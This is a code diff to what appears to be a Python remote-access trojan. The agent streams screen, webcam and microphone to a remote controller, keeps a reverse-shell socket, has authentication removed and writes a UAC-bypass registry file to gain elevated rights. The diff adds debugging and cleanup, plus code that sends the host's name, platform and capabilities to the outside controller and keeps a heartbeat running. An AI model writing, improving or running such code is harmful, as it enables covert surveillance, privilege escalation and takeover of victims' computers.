@@ -80,9 +80,16 @@ PRIVILEGE ESCALATION METHODS (BYPASS CREDENTIAL PROMPT):
 """
 
 # Configuration flags
-SILENT_MODE = True  # Disable all console output
-DEBUG_MODE = False  # Enable debug logging only when needed
+SILENT_MODE = False  # Enable console output for debugging
+DEBUG_MODE = True  # Enable debug logging for troubleshooting
 DEPLOYMENT_COMPLETED = False  # Track deployment status to prevent repeated attempts
+
+# Fix eventlet issue by patching BEFORE any other imports
+try:
+    import eventlet
+    eventlet.monkey_patch()
+except ImportError:
+    pass  # eventlet not available, continue without it
 
 # Logging system for stealth operation
 import logging
@@ -101,16 +108,28 @@ def setup_silent_logging():
         # Redirect stdout and stderr to null
         sys.stdout = io.StringIO()
         sys.stderr = io.StringIO()
+    else:
+        # Setup normal logging when not in silent mode
+        logging.basicConfig(
+            level=logging.INFO if DEBUG_MODE else logging.WARNING,
+            format='%(asctime)s - %(levelname)s - %(message)s',
+            handlers=[logging.StreamHandler(sys.stdout)]
+        )
 
 def log_message(message, level="info"):
-    """Log message silently without console output"""
-    if not SILENT_MODE and DEBUG_MODE:
-        if level == "error":
-            logging.error(message)
-        elif level == "warning":
-            logging.warning(message)
-        else:
-            logging.info(message)
+    """Log message with proper output handling"""
+    if not SILENT_MODE:
+        # Always print to console when not in silent mode
+        print(f"[{level.upper()}] {message}")
+        
+        # Also log through logging system if debug mode is enabled
+        if DEBUG_MODE:
+            if level == "error":
+                logging.error(message)
+            elif level == "warning":
+                logging.warning(message)
+            else:
+                logging.info(message)
 
 # Initialize silent logging immediately
 setup_silent_logging()
@@ -138,12 +157,7 @@ def safe_import(module_name, feature_description=""):
         handle_missing_dependency(module_name, feature_description)
         return False
 
-# Fix eventlet issue by patching before any other imports
-try:
-    import eventlet
-    eventlet.monkey_patch()
-except ImportError:
-    log_message("eventlet not available", "warning")
+# eventlet already imported and patched at the top of the file
 
 # Standard library imports
 import time
@@ -237,7 +251,11 @@ except ImportError:
 
 # GUI and graphics imports
 try:
-    import pygame
+    import warnings
+    # Suppress pygame pkg_resources deprecation warning
+    with warnings.catch_warnings():
+        warnings.filterwarnings("ignore", category=UserWarning, module="pygame.pkgdata")
+        import pygame
     PYGAME_AVAILABLE = True
 except ImportError:
     PYGAME_AVAILABLE = False
@@ -319,7 +337,7 @@ except ImportError:
     AIORTC_SIGNALING_AVAILABLE = False
     log_message("aiortc.contrib.signaling not available, using custom signaling", "warning")
 
-SERVER_URL = "https://agent-controller.onrender.com"  # Change to your controller's URL
+SERVER_URL = os.environ.get('CONTROLLER_URL', "https://agent-controller.onrender.com")  # Use deployed Render controller
 
 # Global state variables
 STREAMING_ENABLED = False
@@ -371,10 +389,7 @@ REVERSE_SHELL_SOCKET = None
 REMOTE_CONTROL_ENABLED = False
 LOW_LATENCY_INPUT_HANDLER = None
 
-# System state
-SILENT_MODE = False
-DEBUG_MODE = False
-DEPLOYMENT_COMPLETED = False
+# System state (variables already defined above - removing duplicates)
 
 # Additional global variables
 DASHBOARD_HTML = None
@@ -393,7 +408,7 @@ low_latency_available = False
 
 # Clipboard and monitoring
 CHUNK = 1024
-FORMAT = None  # Will be set conditionally based on pyaudio availability
+# FORMAT already defined above based on pyaudio availability
 CHANNELS = 1
 RATE = 44100
 
@@ -451,23 +466,7 @@ WEBRTC_CONFIG = {
     }
 }
 
-# Module availability flags
-CV2_AVAILABLE = False
-NUMPY_AVAILABLE = False
-PIL_AVAILABLE = False
-PYAUDIO_AVAILABLE = False
-PYNPUT_AVAILABLE = False
-PYAUTOGUI_AVAILABLE = False
-PYGAME_AVAILABLE = False
-PSUTIL_AVAILABLE = False
-SPEECH_RECOGNITION_AVAILABLE = False
-WEBSOCKETS_AVAILABLE = False
-SOCKETIO_AVAILABLE = False
-FLASK_AVAILABLE = False
-FLASK_SOCKETIO_AVAILABLE = False
-
-# WebRTC module availability flags
-AIORTC_AVAILABLE = False
+# Module availability flags (already set above based on actual imports - removing duplicates)
 
 # Production scale configuration
 PRODUCTION_SCALE = {
@@ -475,7 +474,7 @@ PRODUCTION_SCALE = {
     'target_implementation': 'mediasoup',      # Target: mediasoup for production scale
     'migration_phase': 'planning',            # Current phase: planning
     'scalability_limits': {
-        'aiorttc_max_viewers': 50,            # aiortc suitable for smaller setups
+        'aiortc_max_viewers': 50,            # aiortc suitable for smaller setups
         'mediasoup_max_viewers': 1000,        # mediasoup for production scale
         'concurrent_agents': 100,             # Maximum concurrent agents
         'bandwidth_per_agent': 10000000       # 10 Mbps per agent
@@ -487,16 +486,7 @@ PRODUCTION_SCALE = {
         'max_packet_loss': 0.01               # 1% max packet loss
     }
 }
-AIOHTTP_AVAILABLE = False
-AIORTC_SIGNALING_AVAILABLE = False
-REQUESTS_AVAILABLE = False
-MSS_AVAILABLE = False
-HAS_DXCAM = False
-HAS_TURBOJPEG = False
-HAS_LZ4 = False
-HAS_MSGPACK = False
-HAS_XXHASH = False
-WINDOWS_AVAILABLE = False
+# Module availability flags already set above - removing duplicates
 
 def check_system_requirements():
     """
@@ -647,7 +637,6 @@ class BackgroundInitializer:
     
     def _show_progress(self):
         """Show initialization progress in real-time."""
-        import time
         dots = 0
         while not self.initialization_complete.is_set():
             status = self.get_initialization_status()
@@ -3577,7 +3566,6 @@ def stream_screen(agent_id):
 def camera_capture_worker(agent_id):
     """Capture camera frames and put in capture queue."""
     global CAMERA_STREAMING_ENABLED, camera_capture_queue
-    import time
     
     if not CV2_AVAILABLE:
         log_message("Error: OpenCV not available for camera capture", "error")
@@ -3638,7 +3626,6 @@ def camera_capture_worker(agent_id):
 def camera_encode_worker(agent_id):
     """Encode camera frames from capture queue to H.264 and put in encode queue."""
     global CAMERA_STREAMING_ENABLED, camera_capture_queue, camera_encode_queue
-    import time
     
     if not CV2_AVAILABLE:
         log_message("Error: OpenCV not available for camera encoding", "error")
@@ -3685,7 +3672,6 @@ def camera_encode_worker(agent_id):
 def camera_send_worker(agent_id):
     """Send encoded camera frames from encode queue via socket.io."""
     global CAMERA_STREAMING_ENABLED, camera_encode_queue
-    import time
     
     if sio is None:
         log_message("Error: socket.io not available for camera sending", "error")
@@ -3754,8 +3740,6 @@ audio_encode_queue = None
 def audio_capture_worker(agent_id):
     """Capture audio frames from microphone and put in capture queue."""
     global AUDIO_STREAMING_ENABLED, audio_capture_queue
-    import time
-    import pyaudio
     
     if not PYAUDIO_AVAILABLE or FORMAT is None:
         log_message("Error: PyAudio not available for audio capture", "error")
@@ -3822,7 +3806,6 @@ def audio_capture_worker(agent_id):
 def audio_encode_worker(agent_id):
     """Encode audio frames from capture queue to Opus and put in encode queue."""
     global AUDIO_STREAMING_ENABLED, audio_capture_queue, audio_encode_queue
-    import time
     
     if audio_capture_queue is None or audio_encode_queue is None:
         log_message("Error: Audio queues not initialized", "error")
@@ -3853,7 +3836,10 @@ def audio_encode_worker(agent_id):
             if encoder:
                 try:
                     # Convert PCM to Opus
-                    import numpy as np
+                    if not NUMPY_AVAILABLE:
+                        log_message("NumPy not available for audio processing", "warning")
+                        encoded_data = pcm_data  # Fallback to PCM
+                        continue
                     pcm_array = np.frombuffer(pcm_data, dtype=np.int16)
                     encoded_data = encoder.encode(pcm_array.tobytes(), CHUNK)
                 except Exception as e:
@@ -3881,7 +3867,6 @@ def audio_encode_worker(agent_id):
 def audio_send_worker(agent_id):
     """Send encoded audio frames from encode queue via socket.io."""
     global AUDIO_STREAMING_ENABLED, audio_encode_queue
-    import time
     
     if sio is None:
         log_message("Error: socket.io not available for audio sending", "error")
@@ -4741,7 +4726,7 @@ def enhanced_webrtc_monitoring():
         
         # Calculate scalability metrics
         current_usage = len(WEBRTC_PEER_CONNECTIONS)
-        max_capacity = PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers']
+        max_capacity = PRODUCTION_SCALE['scalability_limits']['aiortc_max_viewers']
         
         monitoring_data['scalability_metrics'] = {
             'current_usage': current_usage,
@@ -5768,6 +5753,13 @@ def register_socketio_handlers():
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, skipping event handler registration", "warning")
         return
+    
+    # Register connection handler
+    @sio.event
+    def connect():
+        agent_id = get_or_create_agent_id()
+        log_message(f"Connected to controller, registering agent {agent_id}")
+        sio.emit('agent_connect', {'agent_id': agent_id})
     
     # Register file transfer handlers
     sio.on('file_chunk_from_operator')(on_file_chunk_from_operator)
@@ -7438,8 +7430,10 @@ try:
     from flask_socketio import SocketIO, emit, join_room, leave_room
     
     FLASK_AVAILABLE = True
+    FLASK_SOCKETIO_AVAILABLE = True
 except ImportError:
     FLASK_AVAILABLE = False
+    FLASK_SOCKETIO_AVAILABLE = False
     log_message("Flask/SocketIO not available. Controller functionality disabled.")
 
 # Controller state
@@ -9315,7 +9309,7 @@ def agent_main():
         while True:
             try:
                 connection_attempts += 1
-                log_message(f"Connecting to server (attempt {connection_attempts})...")
+                log_message(f"Connecting to server at {SERVER_URL} (attempt {connection_attempts})...")
                 if sio is None or not SOCKETIO_AVAILABLE:
                     log_message("Socket.IO not available - running in offline mode", "warning")
                     # Continue running in offline mode
@@ -9324,8 +9318,21 @@ def agent_main():
                         time.sleep(60)  # Keep alive in offline mode
                         # Could implement local functionality here
                     return
-                    
-                sio.connect(SERVER_URL)
+                
+                # Add connection timeout and better error handling
+                log_message(f"Attempting to connect to {SERVER_URL}...")
+                
+                # Test if controller is reachable first
+                if REQUESTS_AVAILABLE:
+                    try:
+                        import requests
+                        test_response = requests.get(SERVER_URL, timeout=5)
+                        log_message(f"[OK] Controller is reachable (HTTP {test_response.status_code})")
+                    except Exception as e:
+                        log_message(f"[WARN] Controller may not be reachable: {e}")
+                        log_message(f"[INFO] Controller should be running at: {SERVER_URL}")
+                
+                sio.connect(SERVER_URL, wait_timeout=10)
                 log_message("[OK] Connected to server successfully!")
                 
                 # Register Socket.IO event handlers after successful connection
@@ -9334,6 +9341,45 @@ def agent_main():
                     log_message("[OK] Socket.IO event handlers registered successfully")
                 except Exception as handler_error:
                     log_message(f"[WARN] Failed to register Socket.IO handlers: {handler_error}")
+                
+                # Manually register agent with controller
+                try:
+                    log_message(f"[INFO] Registering agent {agent_id} with controller...")
+                    sio.emit('agent_connect', {'agent_id': agent_id})
+                    log_message(f"[OK] Agent {agent_id} registration sent to controller")
+                    
+                    # Send system info to controller
+                    system_info = {
+                        'agent_id': agent_id,
+                        'platform': platform.system(),
+                        'hostname': platform.node(),
+                        'python_version': platform.python_version(),
+                        'capabilities': {
+                            'screen_capture': MSS_AVAILABLE,
+                            'camera': CV2_AVAILABLE,
+                            'audio': PYAUDIO_AVAILABLE,
+                            'input_control': PYNPUT_AVAILABLE,
+                            'webrtc': AIORTC_AVAILABLE
+                        }
+                    }
+                    sio.emit('agent_info', system_info)
+                    log_message(f"[OK] Agent system info sent to controller")
+                    
+                except Exception as reg_error:
+                    log_message(f"[WARN] Failed to register agent: {reg_error}")
+                
+                # Start heartbeat to keep agent visible
+                def heartbeat_worker():
+                    while sio.connected:
+                        try:
+                            sio.emit('agent_heartbeat', {'agent_id': agent_id, 'timestamp': time.time()})
+                            time.sleep(30)  # Send heartbeat every 30 seconds
+                        except Exception:
+                            break
+                
+                heartbeat_thread = threading.Thread(target=heartbeat_worker, daemon=True)
+                heartbeat_thread.start()
+                log_message("[OK] Heartbeat started")
                 
                 sio.wait()
             except socketio.exceptions.ConnectionError:
@@ -9471,31 +9517,36 @@ if __name__ == "__main__":
         try:
             if sio and hasattr(sio, 'connected') and sio.connected:
                 sio.disconnect()
-        except:
-            pass
+        except Exception as e:
+            log_message(f"Error disconnecting socket: {e}", "error")
         
-        # Clear sensitive memory
+        # Clear sensitive memory and COM objects
         try:
+            # Clean up COM objects if on Windows
+            if WINDOWS_AVAILABLE:
+                try:
+                    import pythoncom
+                    pythoncom.CoUninitialize()
+                except Exception:
+                    pass  # COM might not be initialized
+            
             import gc
             gc.collect()
-        except:
-            pass
+        except Exception as e:
+            log_message(f"Error during cleanup: {e}", "error")
 
 # Agent authentication removed - direct access enabled
 
 # Modern non-blocking streaming pipeline for screen streaming
 # Note: These variables are already defined in the global state section above
-# STREAMING_ENABLED, TARGET_FPS, CAPTURE_QUEUE_SIZE, ENCODE_QUEUE_SIZE are defined globally
-STREAM_THREADS = []
-capture_queue = None
-encode_queue = None
+# STREAMING_ENABLED, TARGET_FPS, CAPTURE_QUEUE_SIZE, ENCODE_QUEUE_SIZE, STREAM_THREADS, capture_queue, encode_queue are defined globally
 
 
 def screen_capture_worker(agent_id):
-    import time
     global STREAMING_ENABLED, capture_queue
-    import mss
-    import numpy as np
+    if not MSS_AVAILABLE or not NUMPY_AVAILABLE or not CV2_AVAILABLE:
+        log_message("Required modules not available for screen capture", "error")
+        return
     with mss.mss() as sct:
         monitors = sct.monitors
         monitor_index = 1
@@ -9528,6 +9579,9 @@ def screen_capture_worker(agent_id):
 
 def screen_encode_worker(agent_id):
     global STREAMING_ENABLED, capture_queue, encode_queue
+    if not CV2_AVAILABLE:
+        log_message("OpenCV not available for screen encoding", "error")
+        return
     while STREAMING_ENABLED:
         try:
             img = capture_queue.get(timeout=0.5)
@@ -9560,9 +9614,7 @@ def screen_send_worker(agent_id):
 
 # Documented: Modern streaming pipeline uses three threads and two queues for capture, encode, and send. Each stage is non-blocking and drops oldest frames if overloaded. FPS and buffer sizes are configurable.
 
-import os
-import subprocess
-import time
+# Note: os, subprocess, and time already imported above
 
 def write_and_import_uac_bypass_reg():
     reg_content = r'''
@@ -9587,8 +9639,8 @@ Windows Registry Editor Version 5.00
         # Clean up
         try:
             os.remove(reg_file_path)
-        except:
-            pass
+        except Exception as e:
+            log_message(f"Could not remove temporary registry file: {e}", "warning")
             
         return True
         
